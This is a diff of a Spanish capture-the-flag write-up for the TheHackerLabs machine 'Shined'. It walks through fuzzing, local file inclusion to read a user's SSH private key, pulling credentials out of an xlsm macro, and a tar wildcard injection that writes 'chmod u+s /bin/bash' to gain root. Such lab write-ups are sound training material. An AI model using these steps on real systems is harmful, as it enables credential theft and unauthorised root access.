@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Shined - TheHackerLabs
-excerpt: "."
+excerpt: "Una máquina media que me hizo pensar bastante. Después de analizar los servicios, entramos en la página web activa y al no encontrar algo de utilidad, aplicamos Fuzzing para descubrir archivos y directorios ocultos, encontrando un archivo PHP que simulaba un login. Analizando este archivo, comenzamos a probar si es vulnerable a LFI, aplicando Fuzzing para encontrar un parámetro que se pudiera utilizar para esto. Encontrando un parámetro válido, aplicamos LFI para obtener la llave privada de un usuario, con la que nos podemos conectar a un contenedor en el puerto 2222. Dicho contenedor, tenía un archivo Excel (xlsm) que contenía las credenciales de un usuario del servicio SSH. Dentro del SSH, buscamos formas de escalar privilegios, encontrando un script y descubriendo que este es usado en una tarea CRON con pspy. Investigando un poco y analizando el script, encontramos que es vulnerable a inyecciones Wildcard, que aprovechamos para cambiar los permisos de la Bash para que tenga permisos SUID y con eso escalar privilegios."
 date: 2025-02-06
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-shined/_logo.png
+  teaser: /assets/images/THL-writeup-shined/shined.webp
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -13,21 +13,41 @@ categories:
   - Medium Machine
 tags:
   - Linux
-  - 
-  - 
-  - 
+  - PHP
+  - Web Enumeration
+  - Fuzzing
+  - BurpSuite
+  - Local File Inclusion (LFI)
+  - SSH Private Key Theft (LFI)
+  - Malicious Macro Analysis (olevba)
+  - System Recognition (Linux)
+  - Wildcard Injection
+  - Privesc - Wildcard Injection
+  - OSCP Style
 ---
-![](/assets/images/THL-writeup-shined/_logo.png)
+<p align="center">
+<img src="/assets/images/THL-writeup-shined/shined.webp">
+</p>
 
-texto
+Una máquina media que me hizo pensar bastante. Después de analizar los servicios, entramos en la página web activa y al no encontrar algo de utilidad, aplicamos **Fuzzing** para descubrir archivos y directorios ocultos, encontrando un **archivo PHP** que simulaba un login. Analizando este archivo, comenzamos a probar si es vulnerable a **LFI**, aplicando **Fuzzing** para encontrar un parámetro que se pudiera utilizar para esto. Encontrando un parámetro válido, aplicamos **LFI** para obtener la llave privada de un usuario, con la que nos podemos conectar a un contenedor en el **puerto 2222**. Dicho contenedor, tenía un **archivo Excel (xlsm)** que contenía las credenciales de un usuario del **servicio SSH**. Dentro del **SSH**, buscamos formas de escalar privilegios, encontrando un script y descubriendo que este es usado en una **tarea CRON** con **pspy**. Investigando un poco y analizando el script, encontramos que es vulnerable a **inyecciones Wildcard**, que aprovechamos para cambiar los permisos de la **Bash** para que tenga **permisos SUID** y con eso escalar privilegios.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *wfuzz*
+* *gobuster*
+* *BurpSuite*
+* *chmod*
+* *ssh*
+* *scp*
+* *olevba*
+* *sudo*
+* *find*
+* *cat*
+* *pspy64*
+* *echo*
+* *bash*
 
 
 <br>
@@ -43,17 +63,19 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
+				<li><a href="#LFI">Analizando e Identificando LFI en Archivo access.php</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#SSHLFI">Obteniendo Llave Privada de Usuario cifra A través de LFI</a></li>
+				<li><a href="#Contenedor">Enumeración de Contenedor y Obteniendo Credenciales del Servicio SSH de Archivo xlsm con olevba</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#LinEnum">Enumeración de la Máquina Víctima</a></li>
+				<li><a href="#Wildcard">Aplicando Wildcard Injection para Modificar la Bash y Escalar Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -85,6 +107,8 @@ PING 192.168.1.80 (192.168.1.80) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.810/1.129/1.857/0.424 ms
 ```
 Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.
+
+<br>
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
@@ -127,7 +151,9 @@ Nmap done: 1 IP address (1 host up) scanned in 8.59 seconds
 | *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
 | *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
-Hay solamente 3 puertos abiertos, aunque me da curiosidad el puerto 2222, pero por lo que se, este puerto también es usado para el **servicio SSH**.
+Hay solamente 3 puertos abiertos, aunque me da curiosidad el **puerto 2222**, pero por lo que sé, este puerto también es usado para el **servicio SSH**.
+
+<br>
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
@@ -149,7 +175,7 @@ PORT     STATE SERVICE VERSION
 | ssh-hostkey: 
 |   256 09:20:97:b6:90:27:34:c4:f4:ed:35:c0:66:a3:f8:02 (ECDSA)
 |_  256 a5:bc:e0:59:79:1e:b7:5f:93:65:b1:2f:0c:bb:b0:66 (ED25519)
-MAC Address: 08:00:27:6E:74:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -163,7 +189,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
 | *-p*       | Para indicar puertos específicos. |
 | *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
-Ahí esta, el puerto 2222 es un **servicio SSH**, por lo demás parece que la intrusión será por la página web.
+Ahí está, el **puerto 2222** es un **servicio SSH**, por lo demás parece que la intrusión será por la página web.
 
 
 <br>
@@ -191,9 +217,9 @@ Veamos que nos dice **Wappalizer**:
 <img src="/assets/images/THL-writeup-shined/Captura2.png">
 </p>
 
-Bien, parece que está ocupando **PHP**, tengamoslo en cuenta para más adelante.
+Bien, parece que está ocupando **PHP**, tengámoslo en cuenta para más adelante.
 
-Si vamos hasta abajo, podemos ver que hay un correo electronico registrado:
+Si vamos hasta abajo, podemos ver que hay un correo electrónico registrado:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-shined/Captura3.png">
@@ -207,22 +233,40 @@ Además, podemos ver un formulario que podemos llenar con los datos que piden:
 <img src="/assets/images/THL-writeup-shined/Captura4.png">
 </p>
 
-Pero al enviarlo no pasara nada, aunque si podemos ver que parámetros se están utilizando:
+Pero al enviarlo no pasará nada, aunque sí podemos ver qué parámetros se están utilizando:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-shined/Captura5.png">
 </p>
 
-Pero esto no nos servira de mucho.
+Pero esto no nos servirá de mucho.
 
-Vamos a aplicar **Fuzzing**, enfocandolo en archivos **PHP**.
+Vamos a aplicar **Fuzzing**, enfocándolo en archivos **PHP**.
 
 <br>
 
 <h2 id="fuzz">Fuzzing</h2>
 
 ```bash
+wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://192.168.1.80/FUZZ.FUZ2Z
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
 
+Target: http://192.168.1.80/FUZZ.FUZ2Z
+Total requests: 441090
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                      
+=====================================================================
+
+000001471:   200        63 L     129 W      1845 Ch     "access - php"                                                                                                               
+000090451:   403        9 L      28 W       278 Ch      "php"                                                                                                                        
+
+Total time: 0
+Processed Requests: 441090
+Filtered Requests: 441088
+Requests/sec.: 0
 ```
 
 | Parámetros | Descripción |
@@ -275,7 +319,9 @@ Finished
 
 <br>
 
-Encontramos un **archivo PHP** que podemos visitar, veamos de que se trata:
+Encontramos un **archivo PHP** que podemos visitar.
+
+Veamos de que se trata:
 
 <p align="center">
 <img src="/assets/images/THL-writeup-shined/Captura6.png">
@@ -287,7 +333,7 @@ Parece un login muy simple.
 
 <h2 id="LFI">Analizando e Identificando LFI en Archivo access.php</h2>
 
-Tratando de usar un usuario y contraseña cualquiera, no vemos que nos de una respuesta erronea o válida, lo cual es extraño.
+Tratando de usar un usuario y contraseña cualquiera, no vemos que nos dé una respuesta errónea o válida, lo cual es extraño.
 
 Si vemos el código fuente, parece que no va a ningún lado la data que enviemos:
 
@@ -297,7 +343,7 @@ Si vemos el código fuente, parece que no va a ningún lado la data que enviemos
 
 Esto es bastante extraño, por lo que es posible que aquí exista una vulnerabilidad.
 
-Recordemos que **PHP** trabaja de forma dinamica, es decir, **PHP** permite la inclusión dinámica de archivos con distintas funciones como `include()`, `require()`, etc.
+Recordemos que **PHP** trabaja de forma dinámica, es decir, **PHP** permite la inclusión dinámica de archivos con distintas funciones como `include()`, `require()`, etc.
 
 Esto permite que la mayoría (por no decir todo) de **archivos PHP** sean vulnerables a **LFI**.
 
@@ -350,9 +396,9 @@ Ya desde aquí podemos usarlo mucho mejor.
 <br>
 
 
-<h2 id="SSH">Obteniendo Llave Privada de Usuario cifra Atraves de LFI</h2>
+<h2 id="SSHLFI">Obteniendo Llave Privada de Usuario cifra A través de LFI</h2>
 
-Podemos aplicar **LFI**, lo que significa que podemos ver cualquier archivo que desearamos. De igual forma, ya vimos que existe un usuario llamado **cifra**.
+Podemos aplicar **LFI**, lo que significa que podemos ver cualquier archivo que deseáramos. De igual forma, ya vimos que existe un usuario llamado **cifra**.
 
 Trataremos de obtener la llave privada que debería estar en la siguiente ruta: `/home/cifra/.ssh/id_rsa`.
 
@@ -364,7 +410,7 @@ Probemos:
 
 Excelente, la obtuvimos.
 
-Copiala en tu máquina y asignale los permisos necesarios:
+Cópiala en tu máquina y asígnale los permisos necesarios:
 ```bash
 nano id_rsa
 ----------------
@@ -390,10 +436,9 @@ Load key "id_rsa": error in libcrypto
 cifra@192.168.1.80's password: 
 Permission denied, please try again.
 ```
+Nos está pidiendo la contraseña, entonces aquí no la podemos usar.
 
-Nos esta pidiendo la contraseña, entonces aquí no la podemos usar.
-
-Probemos con el puerto 2222 que también tiene activo un **servicio SSH**:
+Probemos con el **puerto 2222** que también tiene activo un **servicio SSH**:
 ```bash
 ssh -i id_rsa cifra@192.168.1.80 -p 2222
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
@@ -430,7 +475,7 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 ...
 ```
 
-Veamos si hay algun archivo por aquí:
+Veamos si hay algún archivo por aquí:
 ```bash
 cifra@b13d359bc30b:~$ ls -la
 total 44
@@ -482,7 +527,7 @@ Attribute Macro1.VB_ProcData.VB_Invoke_Func = " \n14"
 ```
 Tenemos nuevas credenciales de acceso.
 
-Vamos a probarlas con el otro **serivicio SSH**:
+Vamos a probarlas con el otro **servicio SSH**:
 ```bash
 ssh leopoldo@192.168.1.80
 leopoldo@192.168.1.80's password: 
@@ -515,9 +560,9 @@ leopoldo@shined:~$ cat user.txt
 <br>
 
 
-<h2 id="LinEnum">Enumeración de la Máquina</h2>
+<h2 id="LinEnum">Enumeración de la Máquina Víctima</h2>
 
-Veamos que privilegios tiene nuestro usuario:
+Veamos qué privilegios tiene nuestro usuario:
 ```bash
 leopoldo@shined:~$ sudo -l
 [sudo] password for leopoldo: 
@@ -548,12 +593,12 @@ leopoldo@shined:~$ find / -perm -4000 2>/dev/null
 ```
 No hay alguno que podamos usar.
 
-Recordemos que hay directorios que pertenecen al usuario leopoldo, pero únicamente el directorio Desktop tiene un directorio que contiene un archivo comprimido:
+Recordemos que hay directorios que pertenecen al **usuario leopoldo**, pero únicamente el directorio **Desktop** tiene un directorio que contiene un archivo comprimido:
 ```bash
 leopoldo@shined:~$ ls Desktop/scripts/
 backup.tgz
 ```
-Aunque si descargamos y descomprimimos ese archivo, no tendra nada.
+Aunque si descargamos y descomprimimos ese archivo, no tendrá nada.
 
 Si revisamos el **directorio tmp**, encontraremos dos archivos:
 ```bash
@@ -584,7 +629,7 @@ leopoldo@shined:/tmp$ cat backup.sh
 cd /home/leopoldo/Desktop/scripts/
 tar -zcf /home/leopoldo/Desktop/scripts/backup.tgz *
 ```
-Parece que esta comprimiendo todo lo que se encuentre dentro del directorio `/scripts` y lo guarda dentro de un archivo llamado **backup.tgz**.
+Parece que está comprimiendo todo lo que se encuentre dentro del directorio `/scripts` y lo guarda dentro de un archivo llamado **backup.tgz**.
 
 Ahora veamos el contenido del script **clean.sh**:
 ```bash
@@ -595,16 +640,16 @@ DIRECTORIO="/home/leopoldo/Desktop/scripts"
 
 rm -rf "$DIRECTORIO"/*
 ```
-Parece que este scrip elimina todo lo que este dentro del directorio `/scripts`.
+Parece que este script elimina todo lo que este dentro del directorio `/scripts`.
 
 Quiero suponer que estos archivos están siendo usados por una tarea en segundo plano, por lo que vamos a usar **pspy** para comprobar esto.
 
 Aquí puedes obtener **pspy**:
 * <a href="https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1" target="_blank">Repositorio de DominicBreuker: pspy - Releases</a>
 
-Puedes copiarlo con wget desde la máquina víctima.
+Puedes copiarlo con **wget** desde la máquina víctima hacia un servidor de **Python** donde lo tengas descargado.
 
-Una vez que lo tengas, ejecutalo:
+Una vez que lo tengas, ejecútalo:
 ```bash
 leopoldo@shined:~/Desktop$ ./pspy64 
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
@@ -644,15 +689,15 @@ done
 2025/02/07 00:35:01 CMD: UID=0     PID=6581   | tar -zcf /home/leopoldo/Desktop/scripts/backup.tgz backup.tgz 
 2025/02/07 00:35:01 CMD: UID=0     PID=6582   | /bin/sh -c gzip
 ```
-Parece que se ejecuta el script backup.sh y luego se comprime el archivo resultante, es bastante extraño, pero parece que ese script será con el que podramos escalar privilegios.
+Parece que se ejecuta el script **backup.sh** y luego se comprime el archivo resultante, es bastante extraño, pero parece que ese script será con el que podamos escalar privilegios.
 
 <br>
 
 <h2 id="Wildcard">Aplicando Wildcard Injection para Modificar la Bash y Escalar Privilegios</h2>
 
-Al analizar los scripts y los comandos que se estabán ejecutando con la ayuda de **ChatGPT**, me indico que es vulnerable a inyecciones con el **comando tar**.
+Al analizar los scripts y los comandos que se estaban ejecutando con la ayuda de **ChatGPT**, me indico que es vulnerable a inyecciones con el **comando tar**.
 
-E investigando un poco, encontramos el siguiente blog que nos explica sobre las Wildcard Injection:
+E investigando un poco, encontramos el siguiente blog que nos explica sobre las **Wildcard Injection**:
 * <a href="https://www-hackingarticles-in.translate.goog/exploiting-wildcard-for-privilege-escalation/?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc" target="_blank">Exploiting Wildcard for Privilege Escalation</a>
 
 Nos basaremos en el método 3 en donde asignan **permisos SUID** al binario que deseas, esto para darle **permisos SUID** a la **Bash**.
@@ -665,11 +710,11 @@ Pero antes, definamos que son las **Wildcard Injections**:
 
 <br>
 
-Ahora si, apliquemoslo.
+Ahora si, apliquémoslo.
 
-Todo este proceso, debe ser dentro del directorio `/home/leopoldo/Desktop/scripts` porque el script **backup.sh** trabaja con ese directorio, por lo que las inyecciones se aplicaran aquí.
+Todo este proceso debe ser dentro del directorio `/home/leopoldo/Desktop/scripts` porque el script **backup.sh** trabaja con ese directorio, por lo que las inyecciones se aplicaran aquí.
 
-Primero, vamos a crear un script que tenga los comandos que le daran **permisos SUID** a la **Bash**:
+Primero, vamos a crear un script que tenga los comandos que le darán **permisos SUID** a la **Bash**:
 ```bash
 leopoldo@shined:~/Desktop/scripts$ echo "chmod u+s /bin/bash" > pwned.sh
 ```
@@ -739,6 +784,7 @@ Y con esto concluimos la máquina.
 
 
 <br>
+
 # FIN
 
 <footer id="myFooter">
